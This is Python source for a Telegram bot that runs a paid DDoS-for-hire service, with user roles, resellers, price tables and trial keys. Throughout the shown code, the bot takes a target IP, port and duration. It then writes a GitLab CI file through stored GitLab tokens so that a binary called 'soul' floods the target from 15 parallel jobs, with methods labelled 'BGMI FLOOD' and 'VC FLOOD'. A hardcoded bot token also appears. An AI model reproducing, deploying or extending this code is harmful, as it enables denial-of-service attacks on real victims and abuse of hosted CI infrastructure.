#sudo apt update && sudo apt install -y python3 python3-pip python3-venv && pip install python-telegram-bot python-gitlab httpx
import asyncio
import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from telegram.request import HTTPXRequest
import gitlab
from gitlab.exceptions import GitlabError, GitlabAuthenticationError, GitlabGetError

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8960829758:AAGyWL6K5Lh-QUmPt89MmIo53_yOKnnwDqo"
YML_FILE_PATH = ".gitlab-ci.yml"
BINARY_FILE_NAME = "soul"
ATTACK_HISTORY_FILE = "attack_history.json"
ADMIN_IDS = [8560368305]
TARGET_PROJECT_NAME = "soul-worker"  # NEW: Name of project to auto-create

# Conversation states
WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_ATTACK_IP = 7
WAITING_FOR_ATTACK_PORT = 8
WAITING_FOR_ATTACK_TIME = 9
WAITING_FOR_ADD_USER_ID = 10
WAITING_FOR_ADD_USER_DAYS = 11
WAITING_FOR_REMOVE_USER_ID = 12
WAITING_FOR_TRIAL_HOURS = 13
WAITING_FOR_OWNER_ADD_ID = 14
WAITING_FOR_OWNER_ADD_USERNAME = 15
WAITING_FOR_OWNER_REMOVE_ID = 16
WAITING_FOR_RESELLER_ADD_ID = 17
WAITING_FOR_RESELLER_ADD_CREDITS = 18
WAITING_FOR_RESELLER_ADD_USERNAME = 19
WAITING_FOR_RESELLER_REMOVE_ID = 20
WAITING_FOR_TOKEN_ADD = 21
WAITING_FOR_TOKEN_REMOVE = 22
WAITING_FOR_TOKEN_FILE = 23  # NEW: State for token file upload

# Attack management
current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}

# Temporary storage for multi-step operations
temp_data = {}

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}

def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_gitlab_tokens():
    try:
        with open('gitlab_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_gitlab_tokens(tokens):
    with open('gitlab_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 1)
    except FileNotFoundError:
        return 1

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)

def load_attack_history():
    try:
        with open(ATTACK_HISTORY_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_attack_history(history):
    with open(ATTACK_HISTORY_FILE, 'w') as f:
        json.dump(history, f, indent=2)

def append_attack_history(entry):
    attack_history.append(entry)
    if len(attack_history) > 200:
        del attack_history[:-200]
    save_attack_history(attack_history)

# Load all data
authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
gitlab_tokens = load_gitlab_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()
attack_history = load_attack_history()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)

def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until

    if MAINTENANCE_MODE:
        return False, "⚠️ **MAINTENANCE MODE**\n━━━━━━━━━━━━━━━━━━━━━\nBot is under maintenance. Please wait."

    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, f"⚠️ **MAXIMUM ATTACK LIMIT REACHED**\n━━━━━━━━━━━━━━━━━━━━━\nYou have used all {MAX_ATTACKS} attack(s). Contact admin for more."

    if current_attack is not None:
        return False, "⚠️ **ERROR: ATTACK ALREADY RUNNING**\n━━━━━━━━━━━━━━━━━━━━━\nPlease wait until the current attack finishes."

    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ **COOLDOWN REMAINING**\n━━━━━━━━━━━━━━━━━━━━━\nPlease wait {remaining_time} seconds before starting new attack."

    return True, "✅ Ready to start attack"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "GAME"
    elif ip.startswith(('15', '96')):
        return None, "⚠️ Invalid IP - IPs starting with '15' or '96' are not allowed"
    else:
        return "BGMI FLOOD", "GAME"

def is_valid_ip(ip):
    return not ip.startswith(('15', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()

    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

    append_attack_history({
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "time": time_val,
        "method": method
    })

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until

    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))

        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }

    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }

    return {"status": "ready"}

def process_attack_tokens(ip, port, attack_duration, method):
    results = []

    def update_single_token(token_data):
        try:
            result = update_yml_file(
                token_data['token'],
                token_data['group_id'],
                ip, port, attack_duration, method
            )
            results.append((token_data.get('group_name', 'Unknown'), result))
        except Exception:
            results.append((token_data.get('group_name', 'Unknown'), False))

    threads = []
    seen_groups = set()
    unique_tokens = []
    for token_data in gitlab_tokens:
        if token_data.get('group_id') in seen_groups:
            continue
        seen_groups.add(token_data.get('group_id'))
        unique_tokens.append(token_data)

    for token_data in unique_tokens:
        thread = threading.Thread(target=update_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    return results

def generate_trial_key(hours):
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    expiry = time.time() + (hours * 3600)

    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": "system"
    }
    save_trial_keys(trial_keys)

    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)

    if key not in trial_keys:
        return False, "Invalid key"

    key_data = trial_keys[key]

    if key_data["used"]:
        return False, "Key already used"

    if time.time() > key_data["expiry"]:
        return False, "Key expired"

    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)

    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)

    return True, f"✅ Trial access activated for {key_data['hours']} hours!"

# ==================== NEW FUNCTIONS FOR GROUP-BASED ARCHITECTURE ====================

def find_or_create_project_in_group(token, group_id, project_name=TARGET_PROJECT_NAME):
    """
    Find or create a project within a GitLab group.
    
    Args:
        token: GitLab API token
        group_id: GitLab group ID
        project_name: Name of project to find or create (default: soul-worker)
        
    Returns:
        tuple: (project_object, was_created_bool, error_message)
    """
    try:
        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
        gl.auth()
        
        # Get the group
        try:
            group = gl.groups.get(group_id)
        except GitlabGetError:
            return None, False, f"Group ID {group_id} not found or no access"
        
        # List all projects in the group
        projects = group.projects.list(all=True)
        
        # Search for existing project with the target name
        for project in projects:
            if project.name.lower() == project_name.lower():
                # Found existing project, get full project object
                full_project = gl.projects.get(project.id)
                logger.info(f"✅ Found existing project '{project_name}' (ID: {project.id}) in group {group_id}")
                return full_project, False, None
        
        # Project doesn't exist, create it
        try:
            new_project = gl.projects.create({
                'name': project_name,
                'namespace_id': group_id,
                'visibility': 'private',
                'initialize_with_readme': True
            })
            logger.info(f"✅ Created new project '{project_name}' (ID: {new_project.id}) in group {group_id}")
            return new_project, True, None
        except Exception as e:
            return None, False, f"Failed to create project: {str(e)}"
            
    except GitlabAuthenticationError:
        return None, False, "Failed to authenticate with GitLab token"
    except Exception as e:
        return None, False, f"Error: {str(e)}"

def get_target_project_from_group(token, group_id, preferred_name="Lumen"):
    """
    Get target project from a group. Looks for preferred name first, then soul-worker, then first available.
    
    Args:
        token: GitLab API token
        group_id: GitLab group ID
        preferred_name: Preferred project name (default: "Lumen")
        
    Returns:
        tuple: (project_object, project_name, error_message)
    """
    try:
        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
        gl.auth()
        
        # Get the group
        try:
            group = gl.groups.get(group_id)
        except GitlabGetError:
            return None, None, f"Group ID {group_id} not found"
        
        # List all projects in the group
        projects = group.projects.list(all=True)
        
        if not projects:
            return None, None, "No projects found in group"
        
        # Priority 1: Look for preferred name (e.g., "Lumen")
        for project in projects:
            if project.name.lower() == preferred_name.lower():
                full_project = gl.projects.get(project.id)
                return full_project, project.name, None
        
        # Priority 2: Look for "soul-worker"
        for project in projects:
            if project.name.lower() == TARGET_PROJECT_NAME.lower():
                full_project = gl.projects.get(project.id)
                return full_project, project.name, None
        
        # Priority 3: Use first available project
        first_project = gl.projects.get(projects[0].id)
        return first_project, projects[0].name, None
        
    except Exception as e:
        return None, None, f"Error: {str(e)}"

def setup_group_automatically(token, group_id, binary_content=None):
    """
    Automatically setup a group with soul-worker project, binary, and CI/CD.
    
    Args:
        token: GitLab API token
        group_id: GitLab group ID
        binary_content: Binary file content (optional, will try to load from file if not provided)
        
    Returns:
        tuple: (success, project_id, message)
    """
    try:
        # Step 1: Find or create soul-worker project
        project, was_created, error = find_or_create_project_in_group(token, group_id, TARGET_PROJECT_NAME)
        
        if project is None:
            return False, None, f"Failed to setup project: {error}"
        
        project_id = project.id
        
        # Step 2: Upload binary file if available
        if binary_content is None:
            if os.path.exists(BINARY_FILE_NAME):
                with open(BINARY_FILE_NAME, 'rb') as f:
                    binary_content = f.read()
        
        if binary_content:
            success, msg = upload_binary_to_single_project(token, project_id, binary_content)
            if not success:
                logger.warning(f"⚠️ Binary upload failed: {msg}")
        
        status = "created and configured" if was_created else "found and configured"
        return True, project_id, f"Project '{TARGET_PROJECT_NAME}' {status} successfully"
        
    except Exception as e:
        return False, None, f"Setup failed: {str(e)}"

def update_yml_file(token, group_id, ip, port, time_val, method):
    """
    Create/update .gitlab-ci.yml file with GitLab CI syntax.
    NOW USES GROUP-BASED LOOKUP.
    """
    # Get target project from group
    project, project_name, error = get_target_project_from_group(token, group_id)
    
    if project is None:
        logger.error(f"❌ Failed to get project from group {group_id}: {error}")
        return False
    
    project_id = project.id
    
    yml_content = f"""stages:
  - first_batch

run_single_attack:
  stage: first_batch
  parallel: 15  # Set to 1 to run only one job
  image: debian:stable-slim
  script:
    - echo "Running single attack job"
    - chmod +x ./soul
    - ./soul {ip} {port} {time_val} 999
"""

    try:
        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
        gl.auth()
        project = gl.projects.get(project_id)

        try:
            # Try to get existing file
            file = project.files.get(file_path=YML_FILE_PATH, ref='main')
            # Update existing file
            file.content = yml_content
            file.save(branch='main', commit_message=f"Update attack parameters - {ip}:{port} ({method})")
            logger.info(f"✅ Updated .gitlab-ci.yml for project {project_name} (ID: {project_id})")
        except GitlabGetError:
            # Create new file
            project.files.create({
                'file_path': YML_FILE_PATH,
                'branch': 'main',
                'content': yml_content,
                'commit_message': f"Create attack parameters - {ip}:{port} ({method})"
            })
            logger.info(f"✅ Created .gitlab-ci.yml for project {project_name} (ID: {project_id})")

        # GitLab automatically triggers a pipeline on push when .gitlab-ci.yml is created or updated.
        # Avoid creating a second manual pipeline to prevent duplicate runs.
        return True
    except Exception as e:
        logger.error(f"❌ Error for project {project_name} in group {group_id}: {e}")
        return False

def instant_stop_all_jobs(token, group_id):
    """
    Stop all running, pending, or created pipelines in GitLab group projects.
    NOW USES GROUP-BASED LOOKUP.
    """
    try:
        # Get target project from group
        project, project_name, error = get_target_project_from_group(token, group_id)
        
        if project is None:
            logger.error(f"❌ Failed to get project from group {group_id}: {error}")
            return 0
        
        project_id = project.id

        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
        gl.auth()
        project = gl.projects.get(project_id)

        statuses_to_cancel = ['running', 'pending', 'created']
        total_cancelled = 0

        for status in statuses_to_cancel:
            try:
                pipelines = project.pipelines.list(status=status, per_page=100)
                for pipeline in pipelines:
                    try:
                        pipeline.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} pipeline {pipeline.id} for project {project_name}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling pipeline {pipeline.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} pipelines: {e}")

        return total_cancelled

    except Exception as e:
        logger.error(f"❌ Error accessing group {group_id}: {e}")
        return 0

def upload_binary_to_single_project(token, project_id, binary_content):
    """
    Helper function to upload the 'soul' binary file to a single GitLab project.
    Returns (success: bool, message: str)
    """
    try:
        import base64

        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
        gl.auth()
        project = gl.projects.get(project_id)

        # Encode binary content as base64 for GitLab API
        encoded_content = base64.b64encode(binary_content).decode('utf-8')

        try:
            # Try to get existing file
            file = project.files.get(file_path=BINARY_FILE_NAME, ref='main')
            # Update existing file
            file.content = encoded_content
            file.encoding = 'base64'
            file.save(branch='main', commit_message="Auto-upload binary file")
            return True, "Binary file updated successfully"
        except GitlabGetError:
            # Create new file
            project.files.create({
                'file_path': BINARY_FILE_NAME,
                'branch': 'main',
                'content': encoded_content,
                'encoding': 'base64',
                'commit_message': "Auto-upload binary file"
            })
            return True, "Binary file uploaded successfully"

    except Exception as e:
        return False, f"Failed to upload binary: {str(e)}"

# ==================== KEYBOARD GENERATORS ====================

def get_main_keyboard(user_id):
    """Generate main keyboard based on user role"""
    keyboard = []

    # Common buttons for all authorized users
    keyboard.append([KeyboardButton("🎯 Launch Attack"), KeyboardButton("⚡ Quick Launch")])
    keyboard.append([KeyboardButton("📊 Check Status"), KeyboardButton("📈 Attack History")])
    keyboard.append([KeyboardButton("🛑 Stop Attack"), KeyboardButton("📋 My Access")])

    # Admin and Owner buttons
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([KeyboardButton("👥 User Management"), KeyboardButton("⚙️ Bot Settings")])

    # Owner-only buttons
    if is_owner(user_id):
        keyboard.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("🔑 Token Management")])

    keyboard.append([KeyboardButton("🔄 Refresh Status"), KeyboardButton("❓ Help")])

    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_user_management_keyboard():
    """User management keyboard"""
    keyboard = [
        [KeyboardButton("➕ Add User"), KeyboardButton("➖ Remove User")],
        [KeyboardButton("📋 Users List"), KeyboardButton("⏳ Pending Requests")],
        [KeyboardButton("🔑 Generate Trial Key"), KeyboardButton("💰 Price List")],
        [KeyboardButton("🔎 Find User"), KeyboardButton("📈 User Stats")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_owner_panel_keyboard():
    """Owner panel keyboard"""
    keyboard = [
        [KeyboardButton("👑 Add Owner"), KeyboardButton("🗑️ Remove Owner")],
        [KeyboardButton("💰 Add Reseller"), KeyboardButton("🗑️ Remove Reseller")],
        [KeyboardButton("📋 Owners List"), KeyboardButton("💰 Resellers List")],
        [KeyboardButton("📢 Broadcast Message"), KeyboardButton("📤 Upload Binary")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_bot_settings_keyboard():
    """Bot settings keyboard"""
    keyboard = [
        [KeyboardButton("🔧 Toggle Maintenance"), KeyboardButton("⏱️ Set Cooldown")],
        [KeyboardButton("🎯 Set Max Attacks"), KeyboardButton("📋 Admin List")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_token_management_keyboard():
    """Token management keyboard - NOW WITH UPLOAD TOKEN FILE OPTION"""
    keyboard = [
        [KeyboardButton("➕ Add Token"), KeyboardButton("📋 List Tokens")],
        [KeyboardButton("🗑️ Remove Token"), KeyboardButton("🧹 Remove Expired")],
        [KeyboardButton("📤 Upload Token File")],  # NEW BUTTON
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_cancel_keyboard():
    """Cancel keyboard"""
    keyboard = [[KeyboardButton("❌ Cancel")]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ==================== START COMMAND ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🔧 **MAINTENANCE MODE**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot is under maintenance.\n"
            "Please wait until it's back."
        )
        return

    if not can_user_attack(user_id):
        user_exists = False
        for user in pending_users:
            if str(user['user_id']) == str(user_id):
                user_exists = True
                break

        if not user_exists:
            pending_users.append({
                "user_id": user_id,
                "username": update.effective_user.username or f"user_{user_id}",
                "request_date": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_pending_users(pending_users)

            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"🔥 **NEW ACCESS REQUEST**\n━━━━━━━━━━━━━━━━━━━━━\nUser: @{update.effective_user.username or 'No username'}\nID: `{user_id}`\nUse User Management to approve"
                    )
                except:
                    pass

        await update.message.reply_text(
            "📋 **ACCESS REQUEST SENT**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "Your access request has been sent to admin.\n"
            "Please wait for approval.\n\n"
            f"Your User ID: `{user_id}`\n\n"
            "💡 **Want a trial?**\n"
            "Ask admin for a trial key"
        )
        return

    # Get user role
    if is_owner(user_id):
        if is_primary_owner(user_id):
            user_role = "👑 PRIMARY OWNER"
        else:
            user_role = "👑 OWNER"
    elif is_admin(user_id):
        user_role = "🛡️ ADMIN"
    elif is_reseller(user_id):
        user_role = "💰 RESELLER"
    else:
        user_role = "👤 APPROVED USER"

    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks

    attack_status = get_attack_status()
    status_text = ""

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        status_text = f"\n\n🔥 **ACTIVE ATTACK**\nTarget: `{attack['ip']}:{attack['port']}`\nRemaining: `{attack_status['remaining']}s`"
    elif attack_status["status"] == "cooldown":
        status_text = f"\n\n⏳ **COOLDOWN**: `{attack_status['remaining_cooldown']}s`"

    message = (
        f"🤖 **WELCOME TO THE BOT** 🤖\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{user_role}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 **Remaining Attacks:** {remaining_attacks}/{MAX_ATTACKS}\n"
        f"📊 **Status:** {'🟢 Ready' if attack_status['status'] == 'ready' else '🔴 Busy'}"
        f"{status_text}\n\n"
        f"Use the buttons below to navigate:"
    )

    reply_markup = get_main_keyboard(user_id)
    await update.message.reply_text(message, reply_markup=reply_markup)

# ==================== MESSAGE HANDLERS ====================

async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    # Main Menu
    if text == "« Back to Main Menu":
        await show_main_menu(update, user_id)

    # Attack operations
    elif text == "🎯 Launch Attack":
        await launch_attack_start(update, context, user_id)
    elif text == "⚡ Quick Launch":
        await quick_launch_start(update, context, user_id)
    elif text == "📊 Check Status":
        await check_status(update, user_id)
    elif text == "📈 Attack History":
        await attack_history_handler(update, user_id)
    elif text == "🛑 Stop Attack":
        await stop_attack_handler(update, context, user_id)
    elif text == "📋 My Access":
        await my_access(update, user_id)

    # User Management
    elif text == "👥 User Management":
        await show_user_management(update, user_id)
    elif text == "➕ Add User":
        await add_user_start(update, user_id)
    elif text == "➖ Remove User":
        await remove_user_start(update, user_id)
    elif text == "📋 Users List":
        await users_list(update, user_id)
    elif text == "⏳ Pending Requests":
        await pending_requests(update, user_id)
    elif text == "🔑 Generate Trial Key":
        await gen_trial_key_start(update, user_id)
    elif text == "💰 Price List":
        await price_list(update)
    elif text == "🔎 Find User":
        await find_user_start(update, user_id)
    elif text == "📈 User Stats":
        await user_stats(update, user_id)

    # Bot Settings
    elif text == "⚙️ Bot Settings":
        await show_bot_settings(update, user_id)
    elif text == "🔧 Toggle Maintenance":
        await toggle_maintenance(update, user_id)
    elif text == "⏱️ Set Cooldown":
        await set_cooldown_start(update, user_id)
    elif text == "🎯 Set Max Attacks":
        await set_max_attacks_start(update, user_id)
    elif text == "📋 Admin List":
        await admin_list(update, user_id)

    # Owner Panel
    elif text == "👑 Owner Panel":
        await show_owner_panel(update, user_id)
    elif text == "👑 Add Owner":
        await add_owner_start(update, user_id)
    elif text == "🗑️ Remove Owner":
        await remove_owner_start(update, user_id)
    elif text == "💰 Add Reseller":
        await add_reseller_start(update, user_id)
    elif text == "🗑️ Remove Reseller":
        await remove_reseller_start(update, user_id)
    elif text == "📋 Owners List":
        await owner_list(update, user_id)
    elif text == "💰 Resellers List":
        await reseller_list(update, user_id)
    elif text == "📢 Broadcast Message":
        await broadcast_start(update, user_id)
    elif text == "📤 Upload Binary":
        await upload_binary_start(update, user_id)

    # Token Management
    elif text == "🔑 Token Management":
        await show_token_management(update, user_id)
    elif text == "➕ Add Token":
        await add_token_start(update, user_id)
    elif text == "📋 List Tokens":
        await list_tokens(update, user_id)
    elif text == "🗑️ Remove Token":
        await remove_token_start(update, user_id)
    elif text == "🧹 Remove Expired":
        await remove_expired_tokens(update, user_id)
    elif text == "📤 Upload Token File":  # NEW HANDLER
        await upload_token_file_start(update, user_id)

    # Help
    elif text == "❓ Help":
        await help_handler(update, user_id)
    elif text == "🔄 Refresh Status":
        await show_main_menu(update, user_id)

    # Cancel
    elif text == "❌ Cancel":
        # Clear temp data
        if user_id in temp_data:
            del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text("❌ **OPERATION CANCELLED**", reply_markup=reply_markup)

    # Handle multi-step input
    else:
        await handle_text_input(update, context, user_id, text)

# ==================== MENU HANDLERS ====================

async def show_main_menu(update: Update, user_id):
    if is_owner(user_id):
        if is_primary_owner(user_id):
            user_role = "👑 PRIMARY OWNER"
        else:
            user_role = "👑 OWNER"
    elif is_admin(user_id):
        user_role = "🛡️ ADMIN"
    elif is_reseller(user_id):
        user_role = "💰 RESELLER"
    else:
        user_role = "👤 APPROVED USER"

    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks

    attack_status = get_attack_status()
    status_text = ""

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        status_text = f"\n\n🔥 **ACTIVE ATTACK**\nTarget: `{attack['ip']}:{attack['port']}`\nRemaining: `{attack_status['remaining']}s`"
    elif attack_status["status"] == "cooldown":
        status_text = f"\n\n⏳ **COOLDOWN**: `{attack_status['remaining_cooldown']}s`"

    message = (
        f"🤖 **MAIN MENU** 🤖\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{user_role}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 **Remaining Attacks:** {remaining_attacks}/{MAX_ATTACKS}\n"
        f"📊 **Status:** {'🟢 Ready' if attack_status['status'] == 'ready' else '🔴 Busy'}"
        f"{status_text}\n\n"
        f"Use the buttons below:"
    )

    reply_markup = get_main_keyboard(user_id)
    await update.message.reply_text(message, reply_markup=reply_markup)

async def show_user_management(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    message = (
        "👥 **USER MANAGEMENT**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Manage users, approvals, and trial keys\n\n"
        "Select an option below:"
    )

    reply_markup = get_user_management_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def find_user_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "find_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🔎 **FIND USER**\n"
